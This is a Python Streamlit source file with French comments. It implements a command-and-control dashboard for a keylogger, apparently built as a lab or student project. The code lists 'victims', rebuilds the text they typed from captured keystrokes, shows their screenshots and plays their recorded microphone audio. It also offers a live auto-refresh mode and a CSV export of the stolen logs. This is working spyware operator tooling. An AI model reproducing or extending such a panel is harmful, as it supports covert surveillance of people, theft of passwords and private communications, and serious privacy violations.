import streamlit as st
import os
import json
import pandas as pd
import time
from datetime import datetime
import base64 
import io 

# --- CONFIGURATION ---
st.set_page_config(
    page_title="Keylogger C&C Dashboard",
    page_icon="🕵️‍♂️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Chemin vers le dossier de stockage (à ajuster si besoin)
STORAGE_DIR = "../attaquant/stockage/"

# --- FONCTIONS UTILITAIRES ---

def get_victims():
    """Récupère la liste des dossiers victimes."""
    if not os.path.exists(STORAGE_DIR):
        os.makedirs(STORAGE_DIR, exist_ok=True)
        return []
    
    # Liste uniquement les répertoires
    victims = [d for d in os.listdir(STORAGE_DIR) if os.path.isdir(os.path.join(STORAGE_DIR, d))]
    return sorted(victims)

@st.cache_data(show_spinner="Chargement et traitement des logs...")
def load_logs(victim_id):
    """
    Lit le fichier events.jsonl, extrait les événements, gère les schémas mixtes
    (clavier/audio/screenshot) et retourne un DataFrame Pandas.
    """
    path = os.path.join(STORAGE_DIR, victim_id, "events.jsonl")
    
    if not os.path.exists(path):
        return pd.DataFrame()

    all_events = []
    try:
        with open(path, "r", encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    try:
                        # 1. Charger l'objet JSON de la ligne (JSONL)
                        log_entry = json.loads(line)
                        
                        # 2. Extraire la liste 'events' et l'aplatir
                        if "events" in log_entry and isinstance(log_entry["events"], list):
                            all_events.extend(log_entry["events"])
                            
                    except json.JSONDecodeError:
                        continue # Ignore les lignes JSON corrompues
    except Exception as e:
        st.error(f"Erreur de lecture du fichier : {e}")
        return pd.DataFrame()

    if not all_events:
        return pd.DataFrame()

    # Création du DataFrame avec tous les événements aplatis. 
    df = pd.DataFrame(all_events)
    
    # Assurez-vous que la colonne 'type' existe
    if 'type' not in df.columns:
        df['type'] = 'keyboard'
        
    # 3. Traitement du timestamp
    if 'timestamp' in df.columns:
        # Conversion du timestamp (format Unix en DateTime)
        df['Heure'] = pd.to_datetime(df['timestamp'], unit='s', errors='coerce')
        df = df.drop(columns=['timestamp'])
    
    # 4. Traitement des événements Clavier
    if 'key' in df.columns:
        df['key'] = df['key'].fillna('')  # Remplacer NaN par chaîne vide
        # Nettoyage de la colonne 'key' pour un affichage lisible
        df['Touche'] = df['key'].apply(lambda x: 
                                       '' if x == '' else
                                       'space' if x == ' ' else
                                       'enter' if x == 'Key.enter' else
                                       'backspace' if x == 'Key.backspace' else
                                       'NULL/Mouse' if x is None else
                                       x.replace('Key.', '').replace('\\u0013', 'CTRL+S')
                                      )
        df = df.drop(columns=['key'])
            
    # S'assurer que 'Touche' existe même si elle est vide pour les événements non-clavier
    if 'Touche' not in df.columns:
         df['Touche'] = ''

    # Réorganiser les colonnes pour la lisibilité
    cols = ['Heure', 'type', 'Touche']
    # Ajouter les colonnes spécifiques (data sera inclus dans 'cols.extend')
    for col in ['duration', 'rate', 'channels', 'format']:
        if col in df.columns:
            cols.append(col)
            
    # Ajouter toutes les colonnes restantes et supprimer les doublons
    cols.extend([col for col in df.columns if col not in cols])
    df = df[cols].drop_duplicates()
    
    # IMPORTANT : Supprimer le champ 'data' Base64 des événements non-audio/screenshot
    # pour ne pas polluer les tableaux de logs ou les CSV exportés.
    df['data'] = df.apply(lambda row: row['data'] if row['type'] in ['audio', 'screenshot'] else None, axis=1)

    return df

def pcm16_to_wav_bytes(pcm_base64, sample_rate=44100, channels=1):
    """
    Décode les données audio PCM 16-bit Base64 et ajoute l'en-tête WAV.
    Retourne l'objet bytes WAV complet.
    """
    try:
        sample_rate = int(sample_rate)
        channels = int(channels)
    except (TypeError, ValueError):
        return None
        
    try:
        pcm_data = base64.b64decode(pcm_base64)
    except Exception:
        return None

    # Calcul des tailles
    data_size = len(pcm_data)
    bits_per_sample = 16
    byte_rate = sample_rate * channels * 2
    block_align = channels * 2

    # Construction de l'en-tête WAV (44 bytes)
    wav_header = io.BytesIO()

    # RIFF chunk
    wav_header.write(b'RIFF')
    wav_header.write((36 + data_size).to_bytes(4, 'little')) 
    wav_header.write(b'WAVE')

    # fmt sub-chunk
    wav_header.write(b'fmt ')
    wav_header.write((16).to_bytes(4, 'little')) 
    wav_header.write((1).to_bytes(2, 'little')) 
    wav_header.write(channels.to_bytes(2, 'little')) 
    wav_header.write(sample_rate.to_bytes(4, 'little')) 
    wav_header.write(byte_rate.to_bytes(4, 'little')) 
    wav_header.write(block_align.to_bytes(2, 'little')) 
    wav_header.write(bits_per_sample.to_bytes(2, 'little')) 

    # data sub-chunk
    wav_header.write(b'data')
    wav_header.write(data_size.to_bytes(4, 'little')) 

    # Retourner l'en-tête + les données PCM brutes
    return wav_header.getvalue() + pcm_data

def reconstruct_text(df):
    # ... (Le corps de cette fonction reste inchangé car elle ne traite que le type 'keyboard')
    """
    Parcourt le DataFrame et reconstruit le texte tapé, en gérant le backspace, 
    l'espace, et Entrée.
    """
    if df.empty or 'Touche' not in df.columns:
        return "Aucune frappe à analyser."

    # Filtrer uniquement les événements de type clavier avant la reconstruction
    df_keyboard = df[df['type'] == 'keyboard'].copy()

    current_text = []
    
    # Itere sur les touches pour reconstruire le texte
    for index, row in df_keyboard.iterrows():
        key = row['Touche']
        
        # Ignorer les événements sans frappe (y compris ceux marqués vide par load_logs)
        if key == '':
            continue
            
        # 1. Gestion des frappes de caractères simples
        if len(key) == 1 and key.isprintable():
            current_text.append(key)
        
        # 2. Gestion de l'espace
        elif key == 'space':
            current_text.append(' ')
            
        # 3. Gestion d'Entrée (Nouvelle ligne)
        elif key == 'enter':
            current_text.append('\n[ENTRÉE]\n')
            
        # 4. Gestion de la suppression (Backspace)
        elif key == 'backspace':
            if current_text:
                current_text.pop() # Supprime le dernier caractère
        
        # 5. Ignorer les autres touches spéciales
        elif key in ['ctrl_l', 'cmd', 'shift', 'alt', 'up', 'down', 'left', 'right', 'tab', 'NULL/Mouse']:
            pass
        
        # 6. Gestion des autres chaînes (ex: Majuscules)
        else:
            # Si ce n'est pas un caractère de contrôle connu, on l'ajoute tel quel 
            if key not in ['delete', 'caps_lock', 'scroll_lock', 'num_lock', 'insert']:
                current_text.append(key)

    # Joindre les éléments de la liste pour former le texte final
    return "".join(current_text)


# --- INTERFACE GRAPHIQUE ---

# 1. Barre Latérale (Sidebar)
with st.sidebar:
    st.header("🎮 Centre de Contrôle")
    st.divider()
    
    # Rafraîchissement manuel
    if st.button("🔄 Rafraîchir la liste et les logs"):
        # Le cache de load_logs sera effacé, forçant la relecture des fichiers
        st.cache_data.clear()
        st.rerun()

    victims = get_victims()
    
    if not victims:
        st.warning("Aucune victime détectée.")
        selected_victim = None
    else:
        st.success(f"✅ {len(victims)} Victime(s) active(s)")
        selected_victim = st.selectbox("Sélectionner une cible :", victims)
    
    st.divider()
    st.info(f"Dossier de stockage : \n`{os.path.abspath(STORAGE_DIR)}`")

# 2. Zone Principale
st.title("🕵️‍♂️ Dashboard de Surveillance C2")

if selected_victim:
    # --- Configuration du Mode Live ---
    col_header, col_toggle = st.columns([0.8, 0.2])
    with col_header:
        st.subheader(f"Logs pour : **{selected_victim}**")
    with col_toggle:
        live_mode = st.toggle("🔴 MODE LIVE", value=False)

    # --- Chargement et Métriques ---
    df = load_logs(selected_victim)

    if df.empty:
        st.info("Le fichier de logs est vide ou illisible pour le moment.")
    else:
        # Filtrer les DataFrames par type pour les métriques et les sections
        df_keyboard = df[df['type'] == 'keyboard'].copy()
        df_audio = df[df['type'] == 'audio'].copy()
        df_screenshot = df[df['type'] == 'screenshot'].copy() # NOUVEAU DATAFRAME
        
        # Métriques rapides
        m1, m2, m3, m4 = st.columns(4)
        m1.metric("Total Événements", len(df))
        m2.metric("Frappes Clavier", len(df_keyboard))
        m3.metric("Clips Audio", len(df_audio))
        # AJOUT DE LA MÉTRIQUE SCREENSHOT
        m4.metric("Captures Écran", len(df_screenshot))
        
        last_activity = "N/A"
        if 'Heure' in df.columns and not df.empty:
            last_activity = df['Heure'].iloc[-1].strftime("%Y-%m-%d %H:%M:%S")
        
        # Remplacement de m4 par une 5ème colonne
        m5 = st.columns(5)[4] # Hack pour ajouter une 5ème colonne si on veut
        m5.metric("Dernière Activité", last_activity)
        
        st.divider()

        # --- RECONSTRUCTION DU TEXTE ---
        st.header("📝 Texte Reconstruit")
        
        reconstructed_output = reconstruct_text(df_keyboard)

        st.text_area(
            "Sortie Texte Reconstruite : (Utiliser CTRL+A pour tout sélectionner)",
            reconstructed_output,
            height=300
        )
        
        st.divider()
        
        # --- NOUVEAU : ÉVÉNEMENTS SCREENSHOT CAPTURÉS ---
        st.header("📸 Captures d'Écran")
        
        if not df_screenshot.empty:
            st.subheader(f"Total : {len(df_screenshot)} captures")
            
            # Affichage des captures dans une grille de colonnes pour économiser de l'espace
            cols = st.columns(3) # 3 images par ligne
            
            for i, row in df_screenshot.iterrows():
                col = cols[i % 3] # Sélectionne la colonne (0, 1, ou 2)
                
                with col:
                    if 'data' in row and row['data']:
                        try:
                            # Décoder la chaîne Base64 en bytes PNG
                            img_bytes = base64.b64decode(row['data'])
                            # Afficher l'image dans Streamlit
                            st.image(img_bytes, caption=row['Heure'].strftime('%H:%M:%S'), use_column_width=True)
                        except Exception as e:
                            st.warning(f"Erreur de décodage de l'image à {row['Heure'].strftime('%H:%M:%S')}")
        else:
            st.info("Aucune capture d'écran capturée.")
            
        st.divider()

        # --- ÉVÉNEMENTS AUDIO CAPTURÉS ---
        st.header("🎧 Événements Audio Capturés")
        
        if not df_audio.empty:
            st.subheader(f"Total : {len(df_audio)} clips audio")
            
            # Itérer sur les événements audio pour afficher l'information et le lecteur
            for index, row in df_audio.iterrows():
                
                # Vérification rapide des données essentielles
                if 'data' not in row or not row['data']:
                    continue
                
                st.markdown(f"**Clip Audio #{index+1}** : Capture à **{row['Heure'].strftime('%H:%M:%S')}**")
                
                col_info, col_player = st.columns([0.4, 0.6])
                
                # Colonne d'information
                with col_info:
                    st.write(f"Durée : **{row['duration']:.2f} secondes**") 
                    st.write(f"Échantillonnage : **{int(row.get('rate', 44100))} Hz**")
                
                # Colonne du lecteur
                with col_player:
                    # Conversion des données brutes en format WAV pour st.audio
                    wav_bytes = pcm16_to_wav_bytes(
                        row['data'], 
                        sample_rate=row.get('rate', 44100), 
                        channels=row.get('channels', 1) 
                    )
                    
                    if wav_bytes:
                        st.audio(wav_bytes, format='audio/wav')
                    else:
                        st.error("Erreur de décodage ou format audio non supporté.")
                st.divider() 
                
        else:
            st.info("Aucun événement audio capturé.")
            
        st.divider()
        
        # --- Visualisations Graphiques ---
        st.header("📈 Analyse des Frappes Clavier")
        col_visu1, col_visu2 = st.columns(2)

        # ... (Le corps de la visualisation reste inchangé)
        if 'Heure' in df_keyboard.columns and 'Touche' in df_keyboard.columns and not df_keyboard.empty:
            # Visualisation 1 : Activité dans le Temps
            with col_visu1:
                st.subheader("Activité Clavier par Période (10s)")
                # Re-échantillonnage par intervalle de 10 secondes
                df_time = df_keyboard.set_index('Heure').resample('10S').size().reset_index(name='Événements')
                st.line_chart(df_time, x='Heure', y='Événements')

            # Visualisation 2 : Fréquence des Touches
            with col_visu2:
                st.subheader("Top 10 des Touches Fréquentes (Caractères)")
                # Filtrer les touches qui n'ajoutent pas d'info (NULL, Backspace, Modificateurs)
                keys_to_exclude = ['NULL/Mouse', 'ctrl_l', 'cmd', 'shift', 'alt', 'tab', 'backspace', 'enter', 'space']
                common_keys_df = df_keyboard[~df_keyboard['Touche'].isin(keys_to_exclude)]
                
                # Compter les occurrences
                top_keys = common_keys_df['Touche'].value_counts().nlargest(10).reset_index()
                top_keys.columns = ['Touche', 'Fréquence']
                
                # Création du graphique en barres
                st.bar_chart(top_keys, x='Touche', y='Fréquence')

        st.divider()

        # --- Tableau des Logs Détaillés Bruts ---
        st.write("### 📜 Historique Détaillé Brut (Tous Types d'Événements)")
        
        # On retire la colonne 'data' des logs bruts car elle est trop volumineuse
        df_display = df.drop(columns=['data'], errors='ignore')
        
        # Afficher le DataFrame complet, y compris les données audio
        st.dataframe(
            df_display,  # UTILISER df_display
            use_container_width=True, 
            height=300,
            hide_index=True
        )

        # Bouton de téléchargement
        csv = df_display.to_csv(index=False).encode('utf-8')
        st.download_button(
            label="📥 Télécharger les logs complets (CSV)",
            data=csv,
            file_name=f'logs_{selected_victim}_{datetime.now().strftime("%Y%m%d")}.csv',
            mime='text/csv',
        )

    # Logique du mode LIVE (Auto-refresh)
    if live_mode:
        time.sleep(2) # Attendre 2 secondes avant de relancer le script
        st.cache_data.clear() # Effacer le cache pour recharger les logs
        st.rerun()    # Recharger l'application

else:
    # Vue par défaut si aucune victime sélectionnée
    st.write("### Bienvenue dans l'interface de gestion.")
    st.info("Lancez votre serveur Flask et le keylogger pour générer des fichiers dans le dossier de stockage.")
    
    if victims:
        st.write("#### Fichiers de victimes disponibles :")
        for v in victims:
            st.text(f"📂 {v}")